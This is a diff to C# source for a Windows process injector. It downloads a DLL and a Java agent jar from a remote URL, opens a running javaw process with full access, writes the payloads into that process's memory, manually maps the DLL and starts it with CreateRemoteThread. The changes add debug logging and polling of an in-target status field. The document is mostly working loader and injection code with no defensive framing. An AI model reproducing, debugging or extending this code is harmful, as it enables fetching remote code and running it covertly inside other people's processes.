@@ -37,6 +37,9 @@ namespace Svc
         [DllImport("kernel32.dll")]
         static extern bool CloseHandle(IntPtr handle);
 
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern bool ReadProcessMemory(IntPtr proc, IntPtr addr, byte[] buf, uint size, out int read);
+
         [DllImport("kernel32.dll")]
         static extern IntPtr GetModuleHandle(string name);
 
@@ -57,6 +60,7 @@ namespace Svc
             ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
 
             string url = baseUrl.TrimEnd(new char[]{'/'});
+            Console.WriteLine("[*] downloading from " + url);
             byte[] dll, jar;
             try
             {
@@ -66,18 +70,20 @@ namespace Svc
                     jar = wc.DownloadData(url + "/agent.jar");
                 }
             }
-            catch { return 1; }
+            catch (Exception ex) { Console.WriteLine("[!] download failed: " + ex.Message); return 1; }
 
-            if (dll.Length < 64 || jar.Length < 4) return 1;
-            if (ReadU16(dll, 0) != 0x5A4D) return 1;
+            Console.WriteLine("[+] loader.dll=" + dll.Length + " agent.jar=" + jar.Length);
+            if (dll.Length < 64 || jar.Length < 4) { Console.WriteLine("[!] files too small"); return 1; }
+            if (ReadU16(dll, 0) != 0x5A4D) { Console.WriteLine("[!] bad MZ"); return 1; }
             int lfanew = (int)ReadU32(dll, 0x3C);
-            if (ReadU32(dll, lfanew) != 0x4550) return 1;
+            if (ReadU32(dll, lfanew) != 0x4550) { Console.WriteLine("[!] bad PE"); return 1; }
 
             int pid = FindJava();
-            if (pid == 0) return 1;
+            if (pid == 0) { Console.WriteLine("[!] javaw not found"); return 1; }
+            Console.WriteLine("[+] javaw pid=" + pid);
 
             IntPtr proc = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
-            if (proc == IntPtr.Zero) return 1;
+            if (proc == IntPtr.Zero) { Console.WriteLine("[!] OpenProcess failed: " + Marshal.GetLastWin32Error()); return 1; }
 
             int result = InjectManualMap(proc, dll, jar, lfanew);
             Array.Clear(dll, 0, dll.Length);
@@ -114,11 +120,12 @@ namespace Svc
             int w;
             WriteProcessMemory(proc, remoteJar, jar, (uint)jar.Length, out w);
 
-            // allocate context struct in target (marker + jar_addr + jar_size)
-            byte[] ctx = new byte[24];
+            // allocate context struct in target (marker + jar_addr + jar_size + status)
+            byte[] ctx = new byte[32];
             BitConverter.GetBytes((ulong)0x4D4D).CopyTo(ctx, 0);
             BitConverter.GetBytes((ulong)remoteJar.ToInt64()).CopyTo(ctx, 8);
             BitConverter.GetBytes((ulong)jar.Length).CopyTo(ctx, 16);
+            // ctx[24..31] = status (initially 0, DLL writes progress codes here)
             IntPtr remoteCtx = VirtualAllocEx(proc, IntPtr.Zero, (uint)ctx.Length,
                 MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
             WriteProcessMemory(proc, remoteCtx, ctx, (uint)ctx.Length, out w);
@@ -232,13 +239,36 @@ namespace Svc
 
             int tid;
             IntPtr thread = CreateRemoteThread(proc, IntPtr.Zero, 0, remoteTramp, IntPtr.Zero, 0, out tid);
-            if (thread != IntPtr.Zero)
+            if (thread == IntPtr.Zero)
             {
-                WaitForSingleObject(thread, 10000);
-                CloseHandle(thread);
+                Console.WriteLine("[!] CreateRemoteThread failed: " + Marshal.GetLastWin32Error());
+                return 1;
             }
 
+            uint waitResult = WaitForSingleObject(thread, 10000);
+            Console.WriteLine("[*] trampoline wait=" + waitResult);
+            CloseHandle(thread);
+
             VirtualFreeEx(proc, remoteTramp, 0, MEM_RELEASE);
+
+            // read status from DLL — poll for up to 8 seconds
+            IntPtr statusAddr = new IntPtr(remoteCtx.ToInt64() + 24);
+            for (int poll = 0; poll < 16; poll++)
+            {
+                System.Threading.Thread.Sleep(500);
+                byte[] sb = new byte[8];
+                int r;
+                if (ReadProcessMemory(proc, statusAddr, sb, 8, out r) && r == 8)
+                {
+                    ulong st = BitConverter.ToUInt64(sb, 0);
+                    if (st != 0)
+                    {
+                        Console.WriteLine("[*] status=0x" + st.ToString("X2"));
+                        if (st >= 0xA0 || st == 0xFF) break;
+                    }
+                }
+                else break;
+            }
 
             // deferred cleanup: free DLL image, jar bytes, context struct
             System.Threading.ThreadPool.QueueUserWorkItem(_ =>
